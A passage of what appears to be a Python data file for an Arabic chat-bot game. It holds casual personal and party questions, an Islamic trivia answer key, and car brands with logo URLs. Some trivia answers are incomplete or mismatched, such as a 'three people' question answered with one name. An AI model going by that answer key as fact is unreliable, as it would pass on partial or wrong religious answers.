            "هل يمكن لك التخلي عن حبك أمام كرامتك؟",
            "هل أنت سريع البديهة؟",
            "هل يمكنك تصنع البكاء؟",
            "هل تسببت بالأذى لشخص ما في حياتك؟",
            "ما الأهم من وجهة نظرك المظهر",
            "هل اشتريت ملابس فقط لكونها جميلة لكنها لا تناسبك؟",
            "كيف تواجه الظروف الصعبة والمشاكل؟",
            "هل رأي الآخرين مهم بالنسبة لك",
            "هل أنت سريع الغضب أم هادئ إلى حد بعيد؟",
            "هل أنت شخص واثق من نفسه أم خجول؟",
            "تحب السفر : ( لحالك ، اصحابك ، اهلك )",
            "تفضل :  ( فيتمو ، تانج ، بيبسي )",
            "رتبهم : ( الحب ، الصحة ، الكرامة ، المال )",
            "تكره الفئة الي ( كل شوي كلام ، دايم يحش )",
            "م تقدر تسيطر على ( ضحكتك ، نومك ، جوعك )",
            "بداية الحب تكون ( اهتمام ، تضحية ، شعور )",
            "مع او ضد : ( خير لك ان تكون مغفلاً من ان تستغفل غيرك )",
            "يبان عليك الحزن من ( صوتك - ملامحك )",
            "لو قلت لك عرف بنفسك بـ ( شطر ) كيف بتعرف بنفسك ؟",
            "اكتب الكلمة بـ لهجتك ( هربت )",
            "برأيك : كم العمر للزواج (مراة ، رجل )",
            "حط @منشن شخص تقوله: لاتتعب نفسك بالسهر م دريت عنك",
            "تفضل الاكل (البحري ولا المشوي)",
            "منشن.. شخص تقوله ( انت اسطورة )",
            "حط@ منشن لـ شخص تقوله (ارتحت لك)",
            "حط@منشن لـ شخص تقوله( ليه أنت جميل كذا ؟.)",
            "تؤمن ان في (حُب من أول نظرة) ولا لا ؟.",
            "حط@ ومنشن . شخص وقوله (الله يسامحك بس)",
            "ردّك على شخص قال (أنا بطلع من حياتك)؟.",
            "حط@منشن شخص تقوله (بطل تفكر فيني ابي انام)",
            "حط@منشن.  شخص وقوله (حركتك مالها داعي).",
            "أجمل شي بحياتك وش هو؟",
            "لو قابلت نفسك الصغيره وش ممكن تقول لها ؟",
            "لو كنت طبيب والمريض الي تعالجه توفى هل عندك القدره تعلم اهله بوفاته ؟",
            "مشروبك المفضل ؟",
            "هل يمكن أن تنتهك القانون لإنقاذ شخص ما ؟",
            "موهبة اكتشفتها في نفسك خلال فترة الحجر ؟",
            "هل الكل يستحق فرصة ثانية حتى مع اعمالهم السيئة ؟",
            "وقتك المفضل باليوم ؟",
            "يومك المفضل بالأسبوع ؟",
            "سويت شي وفخور بنفسك بسببه ؟",
            "ثلاث أشياء تحبها في نفسك ؟",
            "‏تفضل الأفلام: الوثائقية، الخيال، الرومانسي، الأكشن، الرعب ؟",
            "‏لو قالوا لك تقدر تغير شي واحد بنفسك وش بتغير ؟",
            "اغنيتك المفضلة ؟",
            "‏لو خيرت بين الصداقة او الحب أيهم الاختيار الافضل ؟",
            "كيف تقضي وقت فراغك ؟",
            "شيء تعلمته من الحياة ومستحيل تكرره ؟",
            "فخور بذاتك ؟",
            "سطر من أغنية تحبها ؟",
            "كلمة صرت تقولها كثير ؟",
            "وش اول شيء تسويه اذا عصبت ؟",
            "كم اطول فتره قعدت بدون جوال ؟",
            "لو خيروك تكون حيوان وش بتختار ؟",
            "وش افضل فصل عندك ؟",
            "تفضل غرفة لوحدك أو مع اخوانك ؟",
            "وش افضل جوال أمتلكته ؟",
            "وش أسم مسلسلك المفضل ؟",
            "وش أسم فلمك المفضل ؟",
            "وش شعورك الفترة ذي ؟",
            "يومك مر مثل ما خططت له ؟",
            "مين شخصك المفضل ؟",
            "أقرب ثلاث اشخاص لك ؟",
            "اغنية تهديها للي يحبك ؟",
            "اغنية تهديها للي يكرهك ؟",
            "تحب تقرأ الكتب ؟",
            "وش افضل كتاب عندك ؟",
            "مين الي تحسه مستحملك ؟",
            "تحب المطر و أجواء المطر  ؟",
            "نظرتك عن العلاقات والحب ؟",
            "وش المدينة الي تبي تزورها ؟",
            "متى اخر مره طلعت مع اصحابك ؟",
            "وش تسوي في هذه اللحظه ؟",
            "لو الجواب بيكون مستحيل ايش بيكون السؤال ؟",
            "لون حياتك زي لون تيشيرتك الحين ؟",
            "بكل صراحة عندك شخص يفز قلبك اذا جاك شعار منه ؟",
            "متى اخر هدية جتك ؟",
            "شيء فيك ما عجب أهلك ؟",
            "شيء فيك ما عجب اصحابك ؟",
            "ذوقك حلو في ايش ؟",
            "لو صحيت من النوم وحصلت صاحبك مبلكك وش بتسوي ؟",
            "لو الحياة طلعت حلم تفرح أو تحزن ؟",
            "ورينا أسمك بدون نقاط ؟",
            "عندك حظ في الاشياء الي تحبها ؟",
            "تقدر تتحكم بنفسك اذا غرت ؟",
            "كم مشكلة صارت لك في التلي ؟",
            "ورينا اخر 5 ايموجيات استخدمتها ؟",
            "لو شخص جاء يسرق من تحت مخدتك وش بيحصل ؟",
            "قول خمس اشياء تحبها في نفسك ؟",
            "لو الحرام صار حلال وش اول شيء بتسويه ؟",
            "حط قبل شاحن جوالك 1 وشوف كم يطلع ؟",
            "قد رسبت في مادة ؟",
            "اكله مستحيل تاكلها ؟",
            "قول بلهجتك ( أصمت أُريد التحدث )",
            "منشن @ شخص عشوائي يعطيك افتار",
            "هل انت راضي عن نفسك ؟",
            "‏هل انتِ من محبين الموسيقى الكلاسيكيه او الحديثه ؟",
            "اكله ودك تجربها ؟",
            "لو كانت للأيام الجميلة رائحة وش راح ستختار ؟",
            "شيء تحبه بس الناس تشوفه غريب ؟",
            "لو تكرهه جدًا ؟",
            "عطينا إقتباس تحبه من كِتاب أو اغنية ؟",
            "لو العالم مافيه احد غيرك وش اول شيء راح تسويه ؟",
            "انت إجتماعي أو انطوائي؟",
            "هل يومك جيد بنظرك ؟",
            "تفضل القهوه البارد أو الحاره ؟",
            "تفضل الشاي أو القهوه ؟",
            "تفكيرك صار مختلف عن السنة الماضية ؟",
            "لو يبعث الهدوء بنظرك ؟",
            "اذا بتروح مكتبه مثل جرير اول قسم تتوجه له دائمًا ؟",
            "تقدر تستغني عن جهازك لمدة اسبوع ؟",
            "انت صبور أو متسرع ؟",
            "شيء اساسي في يومك ؟",
            "رسالة لنفسك المستقبلية ؟",
            "وش هو نمط حياتك الأن ؟",
            "تتخذ القرار بالمنطق ام بالعاطفة ؟",
            "خمس اشياء مُمتن لها ؟",
            "أنا مُميز لأنّي _________ ؟",
            "كِلمة تتمنئ أنها تُحذف مِن قأموس مجتمعك ؟",
            "هل لديك حيوان اليف ؟",
            "أفضل أنمي عندك ؟",
            "أفضل فِلم عندك ؟",
            "أفضل مسلسل عندك ؟",
            "وش الفِلم أو الانمي الي تتمنئ الناس تشوفه ؟",
            "لحظات صغيرة من الصعب نسيانها ؟",
            "ماهي اساسيات العلاقة بالنسبة لك ؟",
            "عندك ڤوبيا من وش ؟",
            "ماهي اكثر المناظر التي تحبها ؟",
            "متى شعرت أنك كبرت ؟",
            "كِلمة تُسعد وتُحب سَماعها دائمًا ؟",
            "أكثر جُملة أثرت في حياتك ؟",
            "شخص أثر في حياتك ؟",
            "كِلمة توجهها للي يسطرون ؟",
            "كيف تتوقع حياتك اذا حبيت وخانتك حبيبتك ؟",
            "أخر مره تحدثت في الخاص ؟",
            "كم محادثة في الخاص ؟",
            "كم قروب عندك ؟",
            "عندك قروبات محد يدري عنها ؟",
            "عندك اشخاص مخبيهم عن الناس ؟",
            "تغار على صديقك أو صديقتك ؟",
            "كِلمة للي بيتيكن ؟",
            "قد كرهت أحد بسبب إسلوبه ؟",
            "قد حبيت شخص وخذلك ؟",
            "قد تعرضت للخيانه ؟",
            "قد صار لك حادث ؟",
            "قد حفظت كِتاب الله الكريم ؟",
            "عندك رتبة في القروب ؟",
            "لو قالوا أحظر شخص من الموجودين مين بتختار ؟",
            "اخر صوره حفظتها ؟",
            "تحب التجمعات ؟",
            "كلمة محتاج تسمعها عشان تفرح وتنبسط ؟",
            "اغنيه تحب تسمعها ؟",
            "مدينه تتمنى تسافر لها ؟",
            "( أنتِ غيمة قلبي وأطيَب أشخاصي ) لمن تهدي هالكلام ؟",
            "أذكر 5 اشخاص لازم تسولف معهم ؟",
            "صورة لشيء تتمنى إمتلاكه ؟",
            "اغلب وقتك اليوم قضيته في ؟",
            "منشن اول شخص طرأ على بالك بهاللحظه ؟",
            "قاعده تمشي عليها عند اختيارك للملابس ؟",
            "منشن شخص هنا ودك تكلمه تحظره ؟",
            "اشياء جميلة صارت لك اليوم ؟",
            "منشن شخص وحاول تقلد أسلوبه ؟",
            "اكثر 5 اشياء تكرهها في التلي ؟",
            "تحب الميمز ؟",
            "وش الشيء الي بشخصيتك تعتبره شيء مميز ؟",
            "دولة تتمنئ تزورها ؟",
            "( يا صديقي إن لم يُنصفك كتفي هاك ضلعي، اتكِئ ) منشن شخص يحتاج هالكلام ؟",
            "وش هي افضل سنه في حياتك وليش ؟",
            "‎الكتاب او الفيلم الي تتمنى تعيش فيه، و السبب ؟",
            "وش هي هوايتك المفضله ؟",
            "اذا حياتك هي نفس لون لبسك وش راح تكون ؟",
            "وش هو افضل برنامج عندك ؟",
            "انت شخص صريح ؟",
            "انت شخص تستحي ولا ما عليك ؟",
            "هل شخصيتك بالواقع نفس المواقع ؟",
            "وش اكبر مخاوفك او كوابيسك ؟",
            "تجربة في حياتك تتمنى تعيدها ؟",
            "صفه تحبها فيك سواًء كانت شكليًا او اخلاقيًا ؟",
            "صفة يصفك فيها شخص مقرب لك ؟",
            "أوصف أعز صديق لك ؟",
            "عبر عن مودك ب إيموجي ؟",
            "عندك شخص تفتقده اذا ما سولف ؟",
            "أختراع تتمنى يكون موجود ؟",
            "أول ما تصحى تكلم مين ؟",
            "أول ما تطيح في مصيبة تكلم مين ؟",
            "أول من تفضفض له مين ؟",
            "أكثر مرحله دراسية تحبها ؟",
            "وش اول شيء تسويه اذا تضايقت ؟",
            "اكثر شيء معروف بشخصيتك ؟",
            "كم عدد الاشخاص الي متهاوش معهم ؟",
            "وش تسوي الأن ؟",
            "متى أخر هديه جاتك ؟",
            "شيء فيك ما يعجب أهلك ؟",
            "تحس ذوقك حلو في ايش ؟",
            "اذا صحيت من النوم وحصلت شخصك المفضل مبلكك وش تسوي ؟",
            "أكتب أسمك وأنت مغمض ؟",
            "وش هو أفضل بوت ؟",
            "تقدر تتحكم في ذاتك اذا غرت ؟",
            "كم مشكلة دخلتها حتى الأن ؟",
            "اذا جيت بسرق الي تحت مخدتك وش بحصل ؟",
            "قول أشياء إيجابية عن نفسك ؟",
            "اذا شحن جوالك هو نسبة نعاسك، كم ؟",
            "سوي منشن @ عشوائي وقوله أحبك ؟",
            "قد صديقك سحب عليك عشان حبيبته ؟",
            "أفضل حافز للشخص ؟",
            "مسلسل/فلم تتابعة هالفترة ؟",
            "بماذا تختلف عن الآخرين ؟",
            "ماذا سرقت منك الحياة ؟",
            "صفة تجمّل الشخص برأيك ؟",
            "أفضل شيء تعلمته برأيك ؟",
            "ماذا تشتهي روحك ؟",
            "صورة لها ذكرى لا تنساها ؟",
            "إيموجي يوصف مزاجك حاليًا ؟",
            "الأهم بالنسبة لك، القلب أوم العقل ؟",
            "ما معنى أسمك ؟",
            "أشياء تجيب السعادة ؟",
            "يومك ما يكتمل إلا بـ_____ ؟",
            "أجمل شيء صار لك اليوم ؟",
            "بلد تحب شعبها ؟",
            "كم أسم ( منال ) تعرف في حياتك ؟",
            "هل تعود المياه إلى مجاريها بعد الاعتذار ؟",
            "متى تتقبل الهزيمة في الحب ؟",
            "أول بداية لطريق النجاح ؟",
            "كلمة لأصحاب الشائعات والأخبار الكاذبة ؟",
            "يومك في كلمة ؟",
            "انطباعك عن أسم ( الوليد، العنود ) ؟",
            "بلد تود الإقامة فيها ؟",
            "درس تعلمته في التلي ؟",
            "حيوان تخاف منه ؟",
            "طريقتك على الحصول الرأحة النفسية ؟",
            "أعظم إنجاز لك ؟",
            "نسبة رضاك عن نفسك في الفترة الأخيرة ؟",
            "جنسية غير جنسية بلدك تود لو تحصل عليها ؟",
            "هل للحزن دواء ؟",
            "دعاء وأذكار ترا لها أثر في حياتك ؟",
            "كلمات لا تتحمل سماعها ؟",
            "عطنا اعتراف أو شي حصل معك وإذا حكيت عنه محد صدقك ؟",
            "كيف علاقتك مع الحب ؟",
            "أي ترغب به الآن ؟",
            "متى تكون البراءه ذئب ؟",
            "هل تتوقع أن يصل البشر لمرحلة من التطور تجعلهم يتنقلون بين الكواكب بسهولة ؟",
            "أشياء ومنتجات جربتها في السفر أعجبتك ؟",
            "( الحياة مرة )/ هل قرأتها بالضمة أم بالفتحة ؟",
            "يتجاهلك بالقصد بعد صداقة طويلة، ما مقصده برأيك ؟",
            "شعورك الحالي في جملة ؟",
            "عندكم في الشلة ذلك الشخص الخجول جدًا ؟",
            "أشياء تجعلك تستمر وتتحمّل صعوبات الحياة ؟",
            "فنان/ة تحلم بلقائه ؟",
            "بتنام ولا بتواصل ؟",
            "ردة فعلك لو أوقفتك الشرطة في الطريق وسمعتهم يقولون هذا هو القاتل ؟",
            "شاركنا افضل قناة عندك ؟",
            "شيء جميل حصل معك اليوم ؟",
            "شاركنا صوره تمثل تخصصك ؟",
            "للإناث | لديكِ الجرأة لمصارحة الشخص اللي أذاك بكل شيء في قلبك ؟",
            "أكثر طبع غريب فيك وتحبه ؟",
            "أبسط شيء بعدل يومك كامل ؟",
            "سؤال تسأل نفسك فيه دائمًا ولا حصلت جواب ؟",
            "أسم تحب تقوله ؟",
            "أسم بنت تحبه ؟",
            "أسم ولد تحبه ؟",
            "وش تحس من يوم يناديك أبوك ؟",
            "مين أشد عصبية أمك أو أبوك ؟",
            "عادي تتابع فلم/مسلسل أكثر من مره ؟",
            "تقدر ترسل أخر صوره حفظتها ؟",
            "وش هي أكلتك المفظلة ؟",
            "وش الصفة الي تميزك عن غيرك ؟",
            "أنت شخص مسالم ؟",
            "شيء تسمعه كثير من الناس عنك ؟",
            "تحس أنك غامض ولا سراويلك منشوره ؟",
            "صفة تكرهها ؟",
            "أنت من النوع الي يعرف يسولف ويفتح مواضيع ؟",
            "موضوع ما تتقبل المزح فيه ؟",
            "كِلمة توجهها لوالديك ؟",
            "سطر من أخر أغنية سمعتها ؟",
            "عندك شخص تقوله كل تفاصيل يومك ؟",
            "ليش الاغلب يفضلون العلاقات الإكترونية ؟",
            "وش رأيك بالأهل الي يفتشون الجوالات ؟",
            "أهلك يفتشون جوالك ؟",
            "هل أنت راضي عن نفسك الفترة ذي ؟",
            "أنت من مُحبين الموسيقى القديمة أو الجديدة ؟",
            "أكله ودك تجربها ؟",
            "لو كانت للأيام الجميلة رائحه ماذا ستكون ؟",
            "تاريخ ودك تعيش فيه ؟",
            "لو تكرهه جدًا ؟",
            "عطينا إقتباس تحبه ؟",
            "عطينا حكمة لليوم ؟",
            "حكمتك الي ماشي عليها ؟",
            "أنت فاشل دراسيًا ؟",
            "انت متوظف ؟",
            "أسمك الي بالبرنامج غير عن الواقعي ؟",
            "مين الي أختار لك أسمك ؟",
            "كذبت في الأسئلة الي راحت ؟",
            "لو العالم مافيه أحد غيرك وش بتسوي ؟",
            "هل يومك جيد ؟",
            "القهوة بنظرك ؟",
            "تفكيرك الأن مُختلف عن العام الماضي ؟",
            "لو تروح مكتبه مثل جرير اول قسم تتوجه له دائمًا ؟",
            "تقدر تستغني عن هاتفك لأسبوع ؟",
            "شيء تحس لو ما سويته ليوم تفقده ؟",
            "رسالة لنفسك المستقبيلة ؟",
            "وش رأيك في الي يطلب السناب ؟",
            "تقدر تعطي سنابك أحد ؟",
            "كم شخص مسوي له بلوك ؟",
            "مفهوم الصداقة بالنسبة لك ؟",
            "يزيد حُبي لكِ لمّا ... ؟",
            "مِن نِعْم الحياة ... ؟",
            "اذا فضفضت ترتاح ؟",
            "اكثر شي ينرفزك ؟",
            "اخر مكان رحتله ؟",
            "شخص @ تعترفلة بشي ؟",
            "تغار ؟",
            "تعتقد فيه أحد يراقبك 👩🏼‍💻؟",
            "ولادتك بنفس المكان الي عايش فيه ولا لا؟",
            "اكثر شي ينرفزك ؟",
            "تغار ؟",
            "كم تبلغ ذاكرة هاتفك؟",
            "صندوق اسرارك ؟",
            "شخص @ تعترفله بشي ؟",
            "يومك ضاع على ؟",
            "اغرب شيء حدث في حياتك ؟",
            " نسبة حبك للاكل ؟",
            " حكمة تأمان بيها ؟",
            " اكثر شي ينرفزك ؟",
            " هل تعرضت للظلم من قبل؟",
            " خانوك ؟",
            " تزعلك الدنيا ويرضيك ؟",
            " تاريخ غير حياتك ؟",
            " أجمل سنة ميلادية مرت عليك ؟",
            " ولادتك بنفس المكان الي هسة عايش بي او لا؟",
            " تزعلك الدنيا ويرضيك ؟",
            " ماهي هوايتك؟",
            " دوله ندمت انك سافرت لها ؟",
            "شخص اذا جان بلطلعة تتونس بوجود؟",
            " تاخذ مليون دولار و تضرب خويك؟",
            " تاريخ ميلادك؟",
            "اشكم مره حبيت ؟",
            " يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة ؟",
            " هل تثق في نفسك ؟",
            " اسمك الثلاثي ؟",
            "كلمة لشخص خذلك؟",
            "هل انت متسامح ؟",
            "طريقتك المعتادة في التخلّص من الطاقة السلبية؟",
            "عصير لو قهوة؟",
            " صديق أمك ولا أبوك. ؟",
            "تثق بـ احد ؟",
            "كم مره حبيت ؟",
            " اوصف حياتك بكلمتين ؟",
            " حياتك محلوا بدون ؟",
            " وش روتينك اليومي؟",
            " شي تسوي من تحس بلملل؟",
            " يوم ميلادك ؟",
            " اكثر مشاكلك بسبب ؟",
            " تزعلك الدنيا ويرضيك ؟",
            " تتوقع فيه احد حاقد عليك ويكرهك ؟",
            "كلمة غريبة من لهجتك ومعناها؟",
            " هل تحب اسمك أو تتمنى تغييره وأي الأسماء ستختار",
            "كيف تشوف الجيل ذا؟",
            "تاريخ لن تنساه📅؟",
            "هل من الممكن أن تقتل أحدهم من أجل المال؟",
            "تؤمن ان في حُب من أول نظرة ولا لا ؟.",
            "‏ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭",
            "طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟",
            "ما هو نوع الموسيقى المفضل لديك والذي تستمع إليه دائمًا؟ ولماذا قمت باختياره تحديدًا؟",
            "أطول مدة نمت فيها كم ساعة؟",
            "كلمة غريبة من لهجتك ومعناها؟🤓",
            "ردة فعلك لو مزح معك شخص م تعرفه ؟",
            "شخص تحب تستفزه😈؟",
            "تشوف الغيره انانيه او حب؟",
            "مع او ضد : النوم افضل حل لـ مشاكل الحياة؟",
            "اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟",
            "‏للعيال - آخر مرة وصلك غزل من بنت؟",
            "أوصف نفسك بكلمة؟",
            "شيء من صغرك ماتغير فيك؟",
            "ردة فعلك لو مزح معك شخص م تعرفه ؟",
            "اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث وش راح تكون ؟.",
            "كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟",
            "حاجة تشوف نفسك مبدع فيها ؟",
            "يهمك ملابسك تكون ماركة ؟",
            "يومك ضاع على؟",
            "اذا اكتشفت أن أعز أصدقائك يضمر لك",
            " السوء، موقفك الصريح؟",
            "هل من الممكن أن تقتل أحدهم من أجل المال؟",
            "كلمه ماسكه معك الفترة هذي ؟",
            "كيف هي أحوال قلبك؟",
            "صريح، مشتاق؟",
            "اغرب اسم مر عليك ؟",
            "تختار أن تكون غبي أو قبيح؟",
            "آخر مرة أكلت أكلتك المفضّلة؟",
            "اشياء صعب تتقبلها بسرعه ؟",
            "كلمة لشخص غالي اشتقت إليه؟",
            "اكثر شيء تحس انه مات ف مجتمعنا؟",
            "هل يمكنك مسامحة شخص أخطأ بحقك لكنه قدم الاعتذار وشعر بالندم؟",
            "آخر شيء ضاع منك؟",
            "تشوف الغيره انانيه او حب؟",
            "لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟",
            "شيء كل م تذكرته تبتسم ...",
            "هل تحبها ولماذا قمت باختيارها؟",
            "هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
            "متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟",
            "أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟",
            "هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟",
            "هل تشعر أن هنالك مَن يُحبك؟",
            "وش الشيء الي تطلع حرتك فيه و زعلت ؟",
            "صوت مغني م تحبه",
            "كم في حسابك البنكي ؟",
            "اذكر موقف ماتنساه بعمرك؟",
            "ردة فعلك لو مزح معك شخص م تعرفه ؟",
            "عندك حس فكاهي ولا نفسية؟",
            "من وجهة نظرك ما هي الأشياء التي تحافظ على قوة وثبات العلاقة؟",
            "ما هو نوع الموسيقى المفضل لديك والذي تستمع إليه دائمًا؟ ولماذا قمت باختياره تحديدًا؟",
            "هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
            "هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟",
            "شيء من صغرك ماتغير فيك؟",
            "هل يمكنك أن تضحي بأكثر شيء تحبه وتعبت للحصول عليه لأجل شخص تحبه؟",
            "هل تحبها ولماذا قمت باختيارها؟",
            "كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟",
            "كم مره تسبح باليوم",
            "أفضل صفة تحبه بنفسك؟",
            "أجمل شيء حصل معك خلال هاليوم؟",
            "‏شيء سمعته عالق في ذهنك هاليومين؟",
            "هل يمكنك تغيير صفة تتصف بها فقط لأجل شخص تحبه ولكن لا يحب تلك الصفة؟",
            "‏أبرز صفة حسنة في صديقك المقرب؟",
            "ما الذي يشغل بالك في الفترة الحالية؟",
            "آخر مرة ضحكت من كل قلبك؟",
            "احقر الناس هو من ...",
            "اكثر دوله ودك تسافر لها؟",
            "آخر خبر سعيد، متى وصلك؟",
            "‏نسبة احتياجك للعزلة من 10؟",
            "هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
            "أكثر جملة أثرت بك في حياتك؟",
            "لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .",
            "هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
            "آخر مرة ضحكت من كل قلبك؟",
            "وش الشيء الي تطلع حرتك فيه و زعلت ؟",
            "تزعلك الدنيا ويرضيك ؟",
            "متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟",
            "تعتقد فيه أحد يراقبك؟",
            "احقر الناس هو من ...",
            "شيء من صغرك ماتغير فيك؟",
            "وين نلقى السعاده برايك؟",
            "هل تغارين من صديقاتك؟",
            "أكثر جملة أثرت بك في حياتك؟",
            "كم عدد اللي معطيهم بلوك؟",
            "أجمل سنة ميلادية مرت عليك ؟",
            "أوصف نفسك بكلمة؟",
]
deen = [
        {
            "answer": "اسم لجبلين بمكة",
            "question": "على أي شيء يطلق اسم الأخشبان؟"
        },
        {
            "answer": "اليهود، لأنهم علموا الحق فتركوه وحادوا عنه على علم فاستحقوا غضب الله",
            "question": "من هم المغضوب عليهم؟ ولماذ؟"
        },
        {
            "answer": "النصارى لأنهم حادوا عن الحق جهلاً فكانوا على ضلال بين في شأن عيسى عليه السلام",
            "question": "من هم الضالين؟ ولماذ؟"
        },
        {
            "answer": "خلقها لثلاث: زينة للسماء، ورجوماً للشياطين وعلامات يهتدى بها في البر والبحر",
            "question": " لماذا خلق الله النجوم؟"
        },
        {
            "answer": "الذي يمنع من الحج",
            "question": "على من يطلق المصدود؟"
        },
        {
            "answer": "ذا الكفل",
            "question": "من النبي الذي كان يسمى بشرى؟"
        },
        {
            "answer": "خزيمة بن ثابت رضي الله عنه",
            "question": "من الذي عدلت شهادته شهادة الرجلين؟"
        },
        {
            "answer": "أنس بن مالك",
            "question": "من آخر من توفى من الصحابة؟"
        },
        {
            "answer": "ثلاث قروء أي ثلاث حيضات",
            "question": "كم عدة المرأة المطلقة؟"
        },
        {
            "answer": "رضوان",
            "question": "ما اسم خازن الجنة؟"
        },
        {
            "answer": "مالك",
            "question": "ما اسم خازن النار؟"
        },
        {
            "answer": "البراق",
            "question": "ليلة الإسراء إمتطى النبي محمد صلى الله عليه وسلم دابة مجنحة، ما أسمه؟"
        },
        {
            "answer": "126مرة",
            "question": "ما هو عدد مرات التي ورد فيها ذكر النار في المصحف الشريف؟"
        },
        {
            "answer": "سعد بن أبي وقاص",
            "question": "عشرة من المسلمين بشروا بالجنة من كان آخر من مات منهم؟"
        },
        {
            "answer": "الدينار الذهبي",
            "question": "ماهي العملة الإسلامية الأولى؟"
        },
        {
            "answer": "يوم الجمعة",
            "question": "في أي من أيام الأسبوع خلق الله آدم (عليه السلام )؟"
        },
        {
            "answer": "علي بن ابي طالب",
            "question": "من هم الثلاثة الذين تشتاق الجنة إليهم؟"
        },
        {
            "answer": "النفخة الأولى التي يموت بها جميع الخلائق",
            "question": "يوم ترجف الراجفة.. ما المقصود بالراجفة؟"
        },
        {
            "answer": "النفخة الثانية التي يكون عندها البعث",
            "question": "تتبعها الرادفة ما المقصود بالرادفة؟"
        },
        {
            "answer": "السندس: رقيق الديباج أو الحرير",
            "question": "ما الفرق بين سندس وإستبرق؟"
        },
        {
            "answer": "كلمة “فَأَسْقَيْنَاكُمُوهُ”، وقيل أنها “فَسَيَكْفِيكَهُمُ”",
            "question": "ما أطول كلمة في وردت القرآن الكريم ؟ "
        },
        {
            "answer": "ثلاثة عشر سجدة",
            "question": "كم سجدة يتضمنها القرآن الكريم؟ "
        }
    ]
cars = [
        {
            "brand": "ابارث",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/abarth.png"
        },
        {
            "brand": "اكورا",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Acura.png"
        },
        {
            "brand": "الفاروميو",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/alfaromeo.png"
        },
        {
            "brand": "استن مارتن",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Aston-Martin.png"
        },
        {
            "brand": "اودي",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Audi.png"
        },
        {
            "brand": "بنتلي",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/bentley.png"
        },
        {
            "brand": "بي ام",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/BMW.png"
        },
        {
            "brand": "بيك",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Buick.png"
        },
        {
            "brand": "كاديلاك",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Cadillac.png"
        },
        {
            "brand": "شيفورليه",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Chevrolet.png"
        },
        {
            "brand": "كرايسلر",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/chrysler.png"
        },
        {
            "brand": "ستروين",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Citroen_izmostock.png"
        },
        {
            "brand": "داسيا",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Dacia.png"
        },
        {
            "brand": "دودج",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Dodge.png"
        },
        {
            "brand": "فيراري",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Ferrari.png"
        },
        {
            "brand": "فيات",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/fiat-1.png"
        },
        {
            "brand": "فورد",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Ford.png"
        },
        {
            "brand": "جمس",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/gmc.png"
        },
        {
            "brand": "هونا",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/honda.png"
        },
        {
            "brand": "هامر",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Hummer.png"
        },
        {
            "brand": "هونداي",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Hyundai.png"
        },
        {
            "brand": "انفنيتي",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/infinity.png"
        },
        {
            "brand": "ايسوزو",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Isuzu.png"
        },
        {
            "brand": "جاجوار",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Jaguar.png"
        },
        {
            "brand": "جيب",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Jeep.png"
        },
        {
            "brand": "كيا",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/kia-1.png"
        },
        {
            "brand": "لامبورغيني",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Lamborghini.png"
        },
        {
            "brand": "لانسيا",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/lancia-1.png"
        },
        {
            "brand": "لاند روفر",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/landrover.png"
        },
        {
            "brand": "ليكزس",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Lexus.png"
        },
        {
            "brand": "لينكولن",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Lincoln.png"
        },
        {
            "brand": "لوتس",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Lotus.png"
        },
        {
            "brand": "مازيراي",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/maserati.png"
        },
        {
            "brand": "مازدا",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/mazda-1.png"
        },
        {
            "brand": "مرسيدس",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Mercedes-Benz.png"
        },
        {
            "brand": "ميركوري",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Mercury.png"
        },
        {
